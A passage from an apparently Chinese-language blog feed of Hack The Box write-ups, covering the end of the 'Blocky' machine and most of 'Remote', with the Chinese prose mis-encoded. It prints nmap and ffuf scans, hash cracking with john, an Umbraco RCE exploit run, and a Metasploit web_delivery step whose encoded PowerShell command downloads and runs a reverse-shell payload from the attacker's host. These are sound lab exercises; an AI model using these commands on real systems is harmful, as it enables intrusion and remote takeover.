<span class="token operator">|</span>_  <span class="token number">256</span> 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp    <span class="token function">open</span>   http      Apache httpd <span class="token number">2.4</span>.18
<span class="token operator">|</span>_http-server-header: Apache/2.4.18 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Did not follow redirect to http://blocky.htb
<span class="token number">8192</span>/tcp  closed sophos
<span class="token number">25565</span>/tcp <span class="token function">open</span>   minecraft Minecraft <span class="token number">1.11</span>.2 <span class="token punctuation">(</span>Protocol: <span class="token number">127</span>, Message: A Minecraft Server, Users: <span class="token number">0</span>/20<span class="token punctuation">)</span>
Service Info: Host: <span class="token number">127.0</span>.1.1<span class="token punctuation">;</span> OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">252.53</span> seconds</code></pre>

<p>æ·»åŠ æœ¬åœ°åŸŸåè§£æåˆ°hostsæ–‡ä»¶</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.37 blocky.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts</code></pre>

<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>è®¿é—®ç½‘ç«™å¯ä»¥çœ‹åˆ°cmsä¸ºWordPressï¼Œå¯ä»¥åœ¨æ–‡ç« ä¸­æ‰¾åˆ°ä¸€ä¸ªç”¨æˆ·å(notch)</p>
<img src="/Hackthebox/htb/htb-blocky/image-20250302111220868.png" class="" title="ç›®æ ‡">

<p>ä½¿ç”¨ffuf å¯¹ç›®å½•è¿›è¡Œæ‰«æï¼Œè®¿é—® <a href="http://blocky.htb/plugins">http://blocky.htb/plugins</a> å‘ç°ä¸¤ä¸ªjaråŒ…ï¼šgriefprevention-1.11.2-3.1.1.298.jar å’Œ BlockyCore.jar</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://blocky.htb/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>  

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://blocky.htb/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

wiki                    <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">307</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 113ms<span class="token punctuation">]</span>
wp-content              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 130ms<span class="token punctuation">]</span>
plugins                 <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">310</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 125ms<span class="token punctuation">]</span>
wp-includes             <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">314</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 121ms<span class="token punctuation">]</span>
javascript              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 197ms<span class="token punctuation">]</span>
wp-admin                <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">311</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 118ms<span class="token punctuation">]</span>
phpmyadmin              <span class="token punctuation">[</span>Status: <span class="token number">301</span>, Size: <span class="token number">313</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">10</span>, Duration: 109ms<span class="token punctuation">]</span>
server-status           <span class="token punctuation">[</span>Status: <span class="token number">403</span>, Size: <span class="token number">298</span>, Words: <span class="token number">22</span>, Lines: <span class="token number">12</span>, Duration: 152ms<span class="token punctuation">]</span>
:: Progress: <span class="token punctuation">[</span><span class="token number">220546</span>/220546<span class="token punctuation">]</span> :: Job <span class="token punctuation">[</span><span class="token number">1</span>/1<span class="token punctuation">]</span> :: <span class="token number">897</span> req/sec :: Duration: <span class="token punctuation">[</span><span class="token number">0</span>:04:56<span class="token punctuation">]</span> :: Errors: <span class="token number">0</span> ::</code></pre>

<img src="/Hackthebox/htb/htb-blocky/image-20250302110356493.png" class="" title="jar">

<p>åç¼–è¯‘jaråŒ…å‘ç°å¯†ç <img src="/Hackthebox/htb/htb-blocky/image-20250302110940408.png" class="" title="åç¼–è¯‘"></p>
<h3 id="SSHç™»å½•"><a href="#SSHç™»å½•" class="headerlink" title="SSHç™»å½•"></a>SSHç™»å½•</h3><p>ä½¿ç”¨è·å–åˆ°çš„ç”¨æˆ·å(notch)å’Œå¯†ç æˆåŠŸç™»å½•SSH</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> notch@blocky.htb 
The authenticity of <span class="token function">host</span> <span class="token string">'blocky.htb (10.10.10.37)'</span> can<span class="token string">'t be established.
ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>blocky.htb<span class="token string">' (ED25519) to the list of known hosts.
notch@blocky.htb'</span>s password: 
Welcome to Ubuntu <span class="token number">16.04</span>.2 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">4.4</span>.0-62-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

<span class="token number">7</span> packages can be updated.
<span class="token number">7</span> updates are security updates.


Last login: Fri Jul  <span class="token number">8</span> 07:16:08 <span class="token number">2022</span> from <span class="token number">10.10</span>.14.29
To run a <span class="token builtin class-name">command</span> as administrator <span class="token punctuation">(</span>user <span class="token string">"root"</span><span class="token punctuation">)</span>, use <span class="token string">"sudo &lt;command>"</span><span class="token builtin class-name">.</span>
See <span class="token string">"man sudo_root"</span> <span class="token keyword">for</span> details.

notch@Blocky:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>notch<span class="token punctuation">)</span>,4<span class="token punctuation">(</span>adm<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lxd<span class="token punctuation">)</span>,115<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>
notch@Blocky:~$ </code></pre>

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>è¿è¡Œsudo  -i å¯ä»¥ç›´æ¥åˆ‡æ¢åˆ°rootå¸å·</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">notch@Blocky:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> notch: 
Matching Defaults entries <span class="token keyword">for</span> notch on Blocky:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin

User notch may run the following commands on Blocky:
    <span class="token punctuation">(</span>ALL <span class="token builtin class-name">:</span> ALL<span class="token punctuation">)</span> ALL
notch@Blocky:~$ <span class="token function">sudo</span> <span class="token parameter variable">-i</span> 
root@Blocky:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;notch&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>å¯†ç é‡ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Remote</title>
    <url>/Hackthebox/htb/htb-remote/</url>
    <content><![CDATA[<style>.ptswspbowarv{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="ptswspbowarv">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Windows</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.180 <span class="token parameter variable">-sV</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-23 <span class="token number">20</span>:44 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.13s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65516</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE    SERVICE       VERSION
<span class="token number">21</span>/tcp    <span class="token function">open</span>     <span class="token function">ftp</span>           Microsoft ftpd
<span class="token number">80</span>/tcp    <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">111</span>/tcp   <span class="token function">open</span>     rpcbind       <span class="token number">2</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100000)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>     netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">445</span>/tcp   <span class="token function">open</span>     microsoft-ds?
<span class="token number">2049</span>/tcp  <span class="token function">open</span>     nlockmgr      <span class="token number">1</span>-4 <span class="token punctuation">(</span>RPC <span class="token comment">#100021)</span>
<span class="token number">5985</span>/tcp  <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">15264</span>/tcp filtered unknown
<span class="token number">22011</span>/tcp filtered unknown
<span class="token number">47001</span>/tcp <span class="token function">open</span>     http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token number">49664</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49665</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49666</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49667</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49678</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49679</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">49680</span>/tcp <span class="token function">open</span>     msrpc         Microsoft Windows RPC
<span class="token number">53739</span>/tcp filtered unknown
Service Info: OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">251.51</span> seconds</code></pre>

<p>é¦–å…ˆå°è¯•FTP(21)åŒ¿åç™»å½•ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œç„¶åå¯¹NFS(2049)è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°ç½‘ç«™å¤‡ä»½æ–‡ä»¶ï¼ŒæŒ‚è½½åå¯ä»¥æŸ¥æ‰¾åˆ°adminå‡­è¯</p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ showmount <span class="token parameter variable">-e</span> <span class="token number">10.10</span>.10.180              
Export list <span class="token keyword">for</span> <span class="token number">10.10</span>.10.180:
/site_backups <span class="token punctuation">(</span>everyone<span class="token punctuation">)</span>
$ <span class="token function">mkdir</span> /tmp/site_backups 
$ <span class="token function">sudo</span> <span class="token function">mount</span> <span class="token parameter variable">-t</span> nfs <span class="token number">10.10</span>.10.180:/site_backups /tmp/site_backups
$ <span class="token builtin class-name">cd</span> /tmp/site_backups 
$ <span class="token function">ls</span>
App_Browsers  aspnet_client  css           Media    Umbraco_Client
App_Data      bin            default.aspx  scripts  Views
App_Plugins   Config         Global.asax   Umbraco  Web.config
$ <span class="token builtin class-name">cd</span> App_Data 
strings Umbraco.sdf <span class="token operator">|</span> <span class="token function">grep</span> admin
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa<span class="token punctuation">&#123;</span><span class="token string">"hashAlgorithm"</span><span class="token builtin class-name">:</span><span class="token string">"SHA1"</span><span class="token punctuation">&#125;</span>admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span><span class="token number">192.168</span>.195.1User <span class="token string">"admin"</span> <span class="token operator">&lt;</span>admin@htb.local<span class="token operator">></span>umbraco/user/password/changepassword change
<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span></code></pre>

<p>å°†è·å–åˆ°çš„å¯†ç hashè¿›è¡Œç ´è§£ï¼Œå°†æ”¶é›†åˆ°çš„ç”¨æˆ·åå¯†ç å¤‡ç”¨</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'b8be16afba8c314ad33d812f22a04991b90e2aaa'</span> <span class="token operator">></span> sha1  
$ john sha1 <span class="token parameter variable">--format</span><span class="token operator">=</span>Raw-SHA1 <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>Raw-SHA1 <span class="token punctuation">[</span>SHA1 <span class="token number">256</span>/256 AVX2 8x<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider <span class="token parameter variable">--fork</span><span class="token operator">=</span><span class="token number">8</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
baconandcheese   <span class="token punctuation">(</span>?<span class="token punctuation">)</span>     
1g <span class="token number">0</span>:00:00:00 DONE <span class="token punctuation">(</span><span class="token number">2025</span>-02-23 <span class="token number">21</span>:45<span class="token punctuation">)</span> <span class="token number">1</span>.694g/s 16650Kp/s 16650Kc/s 16650KC/s baconandchipies1<span class="token punctuation">..</span>bacon918
Use the <span class="token string">"--show --format=Raw-SHA1"</span> options to display all of the cracked passwords reliably
Session completed.                          </code></pre>

<p>æ·»åŠ æœ¬åœ°åŸŸåè§£æåˆ°hostsæ–‡ä»¶ï¼Œå¹¶è®¿é—®ç«™ç‚¹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç™»å½•é¡µé¢</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.180 remote.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<img src="/Hackthebox/htb/htb-remote/image-20250223220027043.png" class="" title="è®¿é—®ç½‘ç«™">

<p>ä½¿ç”¨æ”¶é›†åˆ°çš„ç”¨æˆ·åå¯†ç ï¼Œç™»å½•ç½‘ç«™ï¼Œè·å–ç½‘ç«™ç‰ˆæœ¬</p>
<img src="/Hackthebox/htb/htb-remote/image-20250223220241146.png" class="" title="ç™»å½•é¡µé¢">

<img src="/Hackthebox/htb/htb-remote/image-20250223220501688.png" class="" title="æŸ¥çœ‹ç‰ˆæœ¬">

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>é€šè¿‡æ£€ç´¢å¯ä»¥åœ¨github æ‰¾åˆ°ä¸€ä¸ªåˆ©ç”¨è„šæœ¬ï¼š<a href="https://github.com/Jonoans/Umbraco-RCE">https://github.com/Jonoans/Umbraco-RCE</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ python exploit.py <span class="token parameter variable">-u</span> admin@htb.local <span class="token parameter variable">-p</span> baconandcheese <span class="token parameter variable">-w</span> <span class="token string">'http://remote.htb'</span> <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.16.30
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4444</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49695</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4445</span>: Done
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4445: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49696</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Logging <span class="token keyword">in</span> at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span> <span class="token function">whoami</span>
iis apppool<span class="token punctuation">\</span>defaultapppool
PS C:<span class="token punctuation">\</span>windows<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>inetsrv<span class="token operator">></span>  </code></pre>

<p>å°†shell è½¬ç§»åˆ°msfconsoleï¼šä½¿ç”¨<code>multi/script/web_delivery</code> å¤åˆ¶ç”Ÿæˆçš„powershellé“¾æ¥ï¼Œåœ¨è·å–åˆ°çš„shell ä¸Šæ‰§è¡Œï¼ŒæˆåŠŸè·å–åˆ°shellï¼ŒæŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ä¸º Windows Server 2019 (10.0 Build 17763)</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Id  Name
    --  ----
<span class="token operator">=</span><span class="token operator">></span>  <span class="token number">0</span>   Python
    <span class="token number">1</span>   PHP
    <span class="token number">2</span>   PSH
    <span class="token number">3</span>   Regsvr32
    <span class="token number">4</span>   pubprn
    <span class="token number">5</span>   SyncAppvPublishingServer
    <span class="token number">6</span>   PSH <span class="token punctuation">(</span>Binary<span class="token punctuation">)</span>
    <span class="token number">7</span>   Linux
    <span class="token number">8</span>   Mac OS X


msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> target <span class="token number">2</span>
target <span class="token operator">=</span><span class="token operator">></span> <span class="token number">2</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload windows/x64/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/x64/meterpreter/reverse_tcp
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LPORT <span class="token number">4446</span>
LPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">4446</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST tun0 
LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">10.10</span>.16.30
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> SRVPORT <span class="token number">8088</span>
SRVPORT <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8088</span>
msf6 exploit<span class="token punctuation">(</span>multi/script/web_delivery<span class="token punctuation">)</span> <span class="token operator">></span> exploit 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">10.10</span>.16.30:4446 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using URL: http://10.10.16.30:8088/1JHqco9l
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Server started.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Run the following <span class="token builtin class-name">command</span> on the target machine:
powershell.exe <span class="token parameter variable">-nop</span> <span class="token parameter variable">-w</span> hidden <span class="token parameter variable">-e</span> <span class="token assign-left variable">WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AG4AVABYAGcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBuAFQAWABnAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBuAFQAWABnAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAvAEUATABkAEkAMgBNAFUAUwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAnACkAKQA7AA</span><span class="token operator">==</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering AMSI Bypass <span class="token punctuation">(</span><span class="token number">1383</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.180     web_delivery - Delivering Payload <span class="token punctuation">(</span><span class="token number">3703</span> bytes<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span><span class="token number">203846</span> bytes<span class="token punctuation">)</span> to <span class="token number">10.10</span>.10.180
